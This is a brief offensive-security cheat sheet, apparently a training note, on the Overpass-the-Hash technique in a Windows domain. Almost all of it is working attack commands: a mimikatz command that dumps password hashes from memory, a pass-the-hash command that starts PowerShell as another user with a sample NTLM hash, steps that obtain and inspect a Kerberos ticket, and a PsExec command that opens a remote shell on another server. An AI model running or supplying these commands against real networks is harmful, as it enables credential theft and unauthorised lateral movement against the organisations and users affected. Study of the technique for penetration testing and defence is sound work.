NTLM Hash -> generate TGT -> abuse TGT

dumping password hash for target user with mimikatz
```
sekurlsa::logonpasswords
```

Creating a process with a different user's NTLM password hash
```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

generate a TGT by authenticating to a network share on the files04 server with net use
```
net use \\files04
```

 inspect the current TGT available for the running user
```
 klist
```

Opening remote connection using Kerberos
```
.\PsExec.exe \\files04 cmd
```